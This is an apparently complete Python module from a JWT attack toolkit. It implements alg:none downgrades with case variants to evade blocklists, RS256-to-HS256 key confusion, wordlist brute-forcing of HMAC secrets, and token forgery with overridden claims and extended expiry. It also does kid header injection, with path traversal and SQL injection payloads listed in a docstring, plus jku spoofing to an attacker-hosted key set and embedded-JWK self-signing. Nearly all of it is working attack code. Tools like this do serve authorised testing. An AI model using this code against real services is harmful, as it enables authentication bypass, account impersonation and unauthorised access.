import hmac
import hashlib
import json
from typing import Optional, Callable

from .core import (
    b64url_decode, b64url_encode, jwt_split,
    jwt_decode_header, jwt_decode_payload, fix_expiry
)


# ── alg:none ─────────────────────────────────────────────────────────────────

def attack_alg_none(token: str, extend_exp: bool = True) -> dict[str, str]:
    """
    Strip the signature and downgrade algorithm to 'none'.
    Produces multiple case mutations to bypass case-sensitive blocklist checks.
    Also generates variants with a completely absent signature segment vs empty string.
    CVE reference: JWT libraries that accept alg=none without enforcement.
    """
    jwt_split(token)
    header  = jwt_decode_header(token)
    payload = jwt_decode_payload(token)

    if extend_exp:
        payload = fix_expiry(payload)

    alg_variants = ["none", "None", "NONE", "nOnE", "NoNe"]
    results: dict[str, str] = {}

    for variant in alg_variants:
        h_mod = dict(header)
        h_mod["alg"] = variant
        h = b64url_encode(json.dumps(h_mod, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        results[f'alg="{variant}" (empty sig)'] = f"{h}.{p}."
        results[f'alg="{variant}" (no sig)']    = f"{h}.{p}"

    return results


# ── RS256 → HS256 confusion ───────────────────────────────────────────────────

def attack_rs256_hs256(token: str, public_key_path: str, extend_exp: bool = True) -> str:
    """
    Algorithm confusion: sign with HS256 using the RS256 public key as the HMAC secret.
    The server verifies using RSA public key material fed into an HMAC routine.
    Effective when the library derives the verification key from alg header without
    strict algorithm enforcement per key type (CVE-2016-5431 class).
    """
    with open(public_key_path, "rb") as fh:
        pub_key_bytes = fh.read()

    header  = jwt_decode_header(token)
    payload = jwt_decode_payload(token)

    if extend_exp:
        payload = fix_expiry(payload)

    header["alg"] = "HS256"
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(pub_key_bytes, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


# ── HMAC bruteforce ───────────────────────────────────────────────────────────

def _verify_hs(token: str, secret: str) -> bool:
    header = jwt_decode_header(token)
    alg    = header.get("alg", "HS256")
    alg_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    if alg not in alg_map:
        return False

    h, p, s = jwt_split(token)
    signing_input  = f"{h}.{p}".encode()
    expected_sig   = hmac.new(secret.encode(), signing_input, alg_map[alg]).digest()
    try:
        actual_sig = b64url_decode(s)
        return hmac.compare_digest(expected_sig, actual_sig)
    except Exception:
        return False


def bruteforce_secret(
    token: str,
    wordlist_path: str,
    callback: Optional[Callable[[int, str], None]] = None,
) -> Optional[str]:
    """
    Dictionary attack against HMAC-signed JWTs (HS256/384/512).
    Iterates wordlist line-by-line; calls callback every 1 attempts for progress.
    Returns the cracked secret or None.
    """
    header = jwt_decode_header(token)
    alg = header.get("alg", "HS256")
    if not alg.startswith("HS"):
        raise ValueError(f"Token uses {alg} — not an HMAC algorithm, cannot bruteforce.")

    tried = 0
    with open(wordlist_path, "r", errors="ignore") as fh:
        for line in fh:
            secret = line.rstrip("\n")
            tried += 1
            if callback and tried % 1 == 0:
                callback(tried, secret)
            if _verify_hs(token, secret):
                return secret
    return None


# ── Forge / Sign ──────────────────────────────────────────────────────────────

def forge_hs(
    token: str,
    secret: str,
    alg: str = "HS256",
    claims: Optional[dict] = None,
    extend_exp: bool = True,
) -> str:
    """Clone a JWT, apply claim overrides, re-sign with a known HMAC secret."""
    alg_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    if alg not in alg_map:
        raise ValueError(f"Unsupported algorithm: {alg}")

    header  = jwt_decode_header(token)
    payload = jwt_decode_payload(token)
    header["alg"] = alg

    if extend_exp:
        payload = fix_expiry(payload)
    if claims:
        payload.update(claims)

    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, alg_map[alg]).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def forge_rs(
    token: str,
    private_key_path: str,
    alg: str = "RS256",
    claims: Optional[dict] = None,
    extend_exp: bool = True,
) -> str:
    """Clone a JWT, apply claim overrides, re-sign with an RSA private key."""
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.backends import default_backend

    with open(private_key_path, "rb") as fh:
        private_key = serialization.load_pem_private_key(
            fh.read(), password=None, backend=default_backend()
        )

    header  = jwt_decode_header(token)
    payload = jwt_decode_payload(token)
    header["alg"] = alg

    if extend_exp:
        payload = fix_expiry(payload)
    if claims:
        payload.update(claims)

    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    hash_map = {
        "RS256": hashes.SHA256(),
        "RS384": hashes.SHA384(),
        "RS512": hashes.SHA512(),
    }
    if alg not in hash_map:
        raise ValueError(f"Unsupported RSA algorithm: {alg}")

    sig = private_key.sign(signing_input, padding.PKCS1v15(), hash_map[alg])
    return f"{h}.{p}.{b64url_encode(sig)}"


# ── kid injection ─────────────────────────────────────────────────────────────

def attack_kid_injection(
    token: str,
    secret: str,
    kid_payload: str = "../../dev/null",
) -> str:
    """
    Inject a controlled 'kid' header value and sign with a known secret.

    Common payloads:
      ../../dev/null       → empty file → HMAC key = empty string
      /dev/null            → same, absolute path variant
      x' UNION SELECT ...  → SQL injection if kid is used in a DB query
      ../../proc/sys/...   → arbitrary file read via path traversal
    """
    header  = jwt_decode_header(token)
    payload = jwt_decode_payload(token)
    payload = fix_expiry(payload)

    header["kid"] = kid_payload
    header["alg"] = "HS256"

    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


# ── jku / x5u spoofing (token-only, no HTTP server) ──────────────────────────

def attack_jku_spoof(token: str, jku_url: str, private_key_path: str) -> str:
    """
    Replace jku header with an attacker-controlled URL, sign with attacker's private key.
    The remote JWK Set must be hosted separately (e.g. ngrok + Flask).
    """
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
    from cryptography.hazmat.backends import default_backend

    with open(private_key_path, "rb") as fh:
        private_key = serialization.load_pem_private_key(
            fh.read(), password=None, backend=default_backend()
        )

    header  = jwt_decode_header(token)
    payload = jwt_decode_payload(token)
    payload = fix_expiry(payload)

    header["jku"] = jku_url
    header["alg"] = "RS256"
    header.pop("jwk", None)

    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = private_key.sign(signing_input, asym_padding.PKCS1v15(), hashes.SHA256())
    return f"{h}.{p}.{b64url_encode(sig)}"


# ── Embedded JWK self-signed ──────────────────────────────────────────────────

def attack_embedded_jwk(token: str, private_key_path: str, claims: Optional[dict] = None) -> str:
    """
    Embed attacker's own public key in the 'jwk' header field and sign with the
    matching private key. Vulnerable libraries trust the embedded key directly.
    RFC 8725 §3.9 explicitly prohibits this, but many implementations still accept it.
    """
    import json
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    with open(private_key_path, "rb") as fh:
        private_key = serialization.load_pem_private_key(
            fh.read(), password=None, backend=default_backend()
        )
    pub = private_key.public_key()
    pub_numbers = pub.public_numbers()
    n_bytes = pub_numbers.n.to_bytes((pub_numbers.n.bit_length() + 7) // 8, "big")
    e_bytes = pub_numbers.e.to_bytes((pub_numbers.e.bit_length() + 7) // 8, "big")

    jwk = {
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "n": b64url_encode(n_bytes),
        "e": b64url_encode(e_bytes),
    }

    header  = jwt_decode_header(token)
    payload = jwt_decode_payload(token)
    payload = fix_expiry(payload)
    if claims:
        payload.update(claims)

    header["alg"] = "RS256"
    header["jwk"] = jwk
    header.pop("kid", None)
    header.pop("jku", None)

    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding

    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = private_key.sign(signing_input, asym_padding.PKCS1v15(), hashes.SHA256())
    return f"{h}.{p}.{b64url_encode(sig)}"
